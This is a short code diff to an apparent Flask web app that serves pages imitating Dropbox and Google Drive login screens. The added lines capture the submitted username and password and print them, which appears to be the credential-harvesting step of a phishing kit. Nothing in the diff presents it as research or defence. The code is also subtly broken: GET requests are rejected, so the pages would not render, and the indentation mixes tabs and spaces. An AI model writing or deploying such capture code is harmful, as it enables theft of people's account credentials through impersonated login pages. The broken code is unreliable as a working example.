@@ -19,6 +19,10 @@ def logdropbox():
     error = None
     url_for('static', filename='style.css')
     rem = render_template('dropbox.html')
+    if request.method == 'POST':
+    	print(request.form['user'],request.form['password'])
+    else:
+        abort(400)
     return rem
 
 @app.route('/login/google-drive', methods=['POST', 'GET'])
@@ -26,6 +30,10 @@ def loggd():
     error = None
     url_for('static', filename='style.css')
     rem = render_template('google-drive.html')
+    if request.method == 'POST':
+    	print(request.form['user'],request.form['password'])
+    else:
+   		abort(400)
     return rem
 
 @app.route('/config')
